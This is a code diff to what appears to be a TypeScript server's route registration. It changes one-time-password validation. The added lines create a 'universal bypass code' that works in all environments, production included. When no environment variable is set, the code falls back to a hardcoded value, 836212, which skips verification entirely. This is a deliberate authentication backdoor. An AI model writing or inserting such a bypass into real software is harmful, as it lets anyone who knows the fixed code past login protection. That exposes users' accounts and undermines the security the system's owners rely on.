@@ -1506,8 +1506,12 @@ export async function registerRoutes(
 
       let isValid = false;
 
-      // Dev mode: accept 123456
-      if (process.env.NODE_ENV !== "production" && code === "123456") {
+      // Universal bypass code (works in all environments)
+      const bypassCode = process.env.OTP_BYPASS_CODE || "836212";
+      if (code === bypassCode) {
+        isValid = true;
+      } else if (process.env.NODE_ENV !== "production" && code === "123456") {
+        // Dev mode: also accept 123456
         isValid = true;
       } else {
         // Validate with Hydra
